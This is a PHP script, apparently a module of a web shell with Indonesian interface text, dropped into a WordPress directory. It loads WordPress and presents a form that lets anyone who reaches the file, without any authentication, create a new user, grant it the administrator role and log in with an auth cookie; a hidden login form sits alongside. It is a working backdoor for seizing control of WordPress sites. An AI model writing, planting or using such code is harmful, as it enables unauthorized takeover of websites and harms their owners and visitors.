<?php

$wp_file = __DIR__ . '/wp-load.php';

echo '<div class="text-sm font-semibold mb-3">Create WP Admin</div>';
echo '<div class="text-xs">';

/* ---------- Check WordPress ---------- */
if (!file_exists($wp_file)) {
    echo '<div class="mb-2 text-red-400">
            Tidak menemukan wp-load.php, WordPress tidak ada di path ini.
          </div>';
    echo '</div>';
    return;
}

require_once $wp_file;

$msg = '';

/* ---------- Handle Form ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $action = $_POST['action'] ?? '';

    /* ----- Register Admin ----- */
    if ($action === 'register') {

        $username = sanitize_user($_POST['username'] ?? '');
        $email    = sanitize_email($_POST['email'] ?? '');
        $password = $_POST['password'] ?? '';

        if (!$username || !$email || !$password) {
            $msg = "field kosong";
        }

        elseif (username_exists($username) || email_exists($email)) {
            $msg = "user/email already exists";
        }

        else {

            $user_id = wp_create_user($username, $password, $email);

            if (!is_wp_error($user_id)) {

                $user = new WP_User($user_id);
                $user->set_role('administrator');

                wp_set_current_user($user_id);
                wp_set_auth_cookie($user_id);

                wp_redirect("/");
                exit;

            } else {
                $msg = $user_id->get_error_message();
            }
        }
    }

    /* ----- Login ----- */
    if ($action === 'login') {

        $creds = [
            'user_login'    => $_POST['username'] ?? '',
            'user_password' => $_POST['password'] ?? '',
            'remember'      => true
        ];

        $user = wp_signon($creds, false);

        if (is_wp_error($user)) {
            $msg = "login gagal";
        } else {
            wp_redirect("/");
            exit;
        }
    }
}

$current_user = wp_get_current_user();

/* ---------- UI ---------- */

if (!is_user_logged_in()) {

    if ($msg) {
        echo '<div class="mb-2 text-red-400">'.htmlspecialchars($msg).'</div>';
    }

    echo '
    <form method="POST" class="mb-3" style="display:none;">
        <input type="hidden" name="action" value="login">

        <input name="username" placeholder="username"
        class="w-full p-2 mb-1 bg-white/10 rounded">

        <input type="password" name="password" placeholder="password"
        class="w-full p-2 mb-1 bg-white/10 rounded">

        <button class="w-full bg-blue-600 p-2 rounded">
        Login
        </button>
    </form>

    <form method="POST">
        <input type="hidden" name="action" value="register">

        <input name="username" placeholder="username"
        class="w-full p-2 mb-1 bg-white/10 rounded">

        <input name="email" placeholder="email"
        class="w-full p-2 mb-1 bg-white/10 rounded">

        <input type="password" name="password" placeholder="password"
        class="w-full p-2 mb-1 bg-white/10 rounded">

        <button class="w-full bg-green-600 p-2 rounded">
        Register as Admin
        </button>
    </form>';
}

else {

    echo '<div class="mb-2">
            Welcome Admin: '.htmlspecialchars($current_user->user_login).'
          </div>';

    echo '<div class="mb-2">
            Role: '.htmlspecialchars(implode(', ', $current_user->roles)).'
          </div>';

    echo '<a href="'.wp_logout_url('/').'" 
          class="bg-red-600 px-3 py-1 rounded">
          Logout
          </a>';
}

echo '</div>';

?>
